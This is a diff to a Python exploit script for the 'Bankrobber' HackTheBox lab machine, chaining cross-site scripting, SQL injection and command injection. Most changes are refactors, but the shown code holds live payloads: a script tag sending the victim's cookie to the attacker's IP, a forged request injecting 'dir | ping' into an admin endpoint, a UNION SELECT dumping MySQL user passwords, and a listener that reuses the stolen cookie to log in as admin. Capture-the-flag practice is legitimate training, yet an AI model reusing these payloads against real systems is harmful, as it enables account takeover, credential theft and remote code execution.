@@ -8,17 +8,17 @@ from http.server import BaseHTTPRequestHandler, HTTPServer
 
 parser = argparse.ArgumentParser(description='XSS => SQi => RCE (Bankrobber hackthebox)')
 
-parser.add_argument("--targetIp", default="http://10.10.10.154/", type=str, help="Bankrobber ip address")
+parser.add_argument("--targetIp", default="10.10.10.154", type=str, help="Bankrobber ip address")
 parser.add_argument("--localIp", default="10.10.14.24", type=str, help="Your IP address")
 args = parser.parse_args()
 session = requests.Session()
 
 
-def urlencode(str):
+def url_encode(str):
     return urllib.parse.quote(str)
 
 
-def urldecode(str):
+def url_decode(str):
     return urllib.parse.unquote(str)
 
 
@@ -49,12 +49,12 @@ def send_xsrf():
         "comment": "<script>const req = new XMLHttpRequest();const params = 'cmd=dir | ping " + args.localIp + "';req.open('POST', 'http://localhost/admin/backdoorchecker.php', true);req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');req.send(params);</script>",
     }
 
-    tr_response = session.post(args.targetIp + "user/transfer.php", data=transfer_data)
+    tr_response = session.post("http://" + args.targetIp + "user/transfer.php", data=transfer_data)
     print(str(tr_response.status_code) + "; XSRF send, waiting for response cookie..")
 
 
 def send_sqli():
-    search_res = session.post(args.targetIp + "admin/search.php",
+    search_res = session.post("http://" + args.targetIp + "admin/search.php",
                               data={"term": "1' UNION SELECT user,password,3 from mysql.user;-- -"})
 
 
@@ -80,7 +80,7 @@ def send_xss():
         "comment": '<script>new Image().src="http://' + args.localIp + '/cookie?c="+btoa(document.cookie);</script>',
     }
 
-    tr_response = session.post(args.targetIp + "user/transfer.php", data=transfer_data)
+    tr_response = session.post("http://" + args.targetIp + "user/transfer.php", data=transfer_data)
     print(str(tr_response.status_code) + "; XSS send, waiting for response cookie..")
 
 
@@ -101,7 +101,7 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
         print("GET " + self.path)
 
         cookie = base64.b64decode(self.path.split("=")[1] + "==").decode('utf8', errors='ignore')
-        password = urldecode(cookie.split(";")[1].split("=")[1])
+        password = url_decode(cookie.split(";")[1].split("=")[1])
 
         login_data = {
             "username": "admin",
@@ -109,7 +109,7 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
             "pounds": "Submit Query"
         }
 
-        is_logged = session.post(args.targetIp + "login.php", data=login_data)
+        is_logged = session.post("http://" + args.targetIp + "login.php", data=login_data)
 
         if "You're not authorized" in is_logged.text:
             raise Exception("Your are not logged as admin into bankrobber")
